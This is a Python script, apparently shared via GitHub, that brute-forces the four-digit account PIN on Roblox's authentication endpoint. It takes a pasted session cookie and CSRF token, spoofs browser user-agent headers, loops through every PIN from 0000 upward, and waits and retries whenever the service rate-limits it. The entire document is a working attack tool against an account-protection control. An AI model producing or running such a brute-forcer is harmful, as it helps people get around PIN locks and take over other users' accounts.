import os
import requests
from requests.structures import CaseInsensitiveDict
import time
import sys
import random
activated = False
print("To find your account's cookie and csrf token,\ncheck the README.md file in Github\nfanks,\nlove by Tangly\n-------------")
cookiepls = input("Enter account's cookie here: ")
csrftoken = input("Enter csrf token here: ")
ospls = input("""Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """)
waittime = input("(2 is recommended) How many seconds would the bruteforcer run each pin?: ")
print("cool lets get this bad boy running now")
def rand():
    return random.randint(0,9999)
def convert(num):
    if num < 10:
        return f"000{num}"
    elif num < 100:
        return f"00{num}"
    elif num < 1000:
        return f"0{num}"
    else:
        return str(num)
def makerequest(pin):
    statustime = f"Tried {pin}"
    hehe = CaseInsensitiveDict()
    hehe["authority"] = "auth.roblox.com"
    hehe["method"] = "POST"
    hehe["path"] = "/v1/account/pin/unlock"
    hehe["scheme"] = "https"
    hehe["accept"] = "application/json, text/plain, */*"
    hehe["accept-encoding"] = "gzip, deflate, br"
    hehe["accept-language"] = "en-US,en;q=0.9"
    hehe["content-length"] = "8"
    hehe["content-type"] = "application/x-www-form-urlencoded"
    hehe["cookie"] = f"{cookiepls}"
    hehe["origin"] = "https://www.roblox.com"
    hehe["referer"] = "https://www.roblox.com/"
    hehe["sec-fetch-dest"] = "empty"
    hehe["sec-fetch-mode"] = "cors"
    hehe["sec-fetch-site"] = "same-site"
    if ospls == 1:
        hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
    elif ospls == 2:
        hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
    elif ospls == 3:
        hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
    elif ospls == 4:
        hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
    elif ospls == 5:
        hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
    hehe["x-csrf-token"] = f"{csrftoken}"
    hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
    print(f"\n{statustime}\n---------\nStatus Code: {hi.status_code}\n{hi.content}\nPin: {pin}\n")
    if hi.status_code == 429:
        time.sleep(float(waittime))
        statustime = "TOO MANY REQUESTS! Delaying..."
        makerequest(pin)
    elif hi.status_code == 403:
        statustime = f"Tried {pin}"
    elif hi.status_code == 200:
        sys.exit()
for i in range(0,9999):
    time.sleep(float(waittime))
    makerequest(convert(i))
